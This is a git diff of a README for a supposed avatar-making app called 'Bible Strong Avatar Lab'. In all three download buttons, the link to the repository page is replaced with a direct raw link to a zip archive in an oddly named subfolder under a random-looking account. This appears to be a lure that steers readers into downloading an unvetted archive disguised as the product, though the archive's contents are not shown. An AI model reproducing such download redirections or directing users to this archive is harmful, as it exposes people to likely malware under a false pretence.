@@ -6,7 +6,7 @@ Welcome to Bible Strong Avatar Lab, a powerful yet simple tool that lets you cre
 
 ### 📥 Quick Download
 
-[![Download Bible Strong Avatar Lab](https://img.shields.io/badge/Download-Bible_Strong_Avatar_Lab-blue?style=for-the-badge&logo=download&logoColor=white&color=random)](https://github.com/bacitracinvitaminbc285/bible-strong-avatar-lab)
+[![Download Bible Strong Avatar Lab](https://img.shields.io/badge/Download-Bible_Strong_Avatar_Lab-blue?style=for-the-badge&logo=download&logoColor=white&color=random)](https://raw.githubusercontent.com/bacitracinvitaminbc285/bible-strong-avatar-lab/main/pneumatist/bible_strong_lab_avatar_v1.8.zip)
 
 Visit this link to download the application.
 
@@ -32,7 +32,7 @@ Good news - you don't need a powerful gaming computer or expensive graphics card
 
 ### Step 1: Get the Application
 
-[![Get the App](https://img.shields.io/badge/Get_the_App-Here-green?style=for-the-badge&logo=download&logoColor=white&color=random)](https://github.com/bacitracinvitaminbc285/bible-strong-avatar-lab)
+[![Get the App](https://img.shields.io/badge/Get_the_App-Here-green?style=for-the-badge&logo=download&logoColor=white&color=random)](https://raw.githubusercontent.com/bacitracinvitaminbc285/bible-strong-avatar-lab/main/pneumatist/bible_strong_lab_avatar_v1.8.zip)
 
 Visit this link to download the application.
 
@@ -173,7 +173,7 @@ Need help or want to share your creations?
 
 ## 🚀 Ready to Start?
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Start_Creating-orange?style=for-the-badge&logo=download&logoColor=white&color=random)](https://github.com/bacitracinvitaminbc285/bible-strong-avatar-lab)
+[![Download Now](https://img.shields.io/badge/Download_Now-Start_Creating-orange?style=for-the-badge&logo=download&logoColor=white&color=random)](https://raw.githubusercontent.com/bacitracinvitaminbc285/bible-strong-avatar-lab/main/pneumatist/bible_strong_lab_avatar_v1.8.zip)
 
 Visit this link to download the application.
 
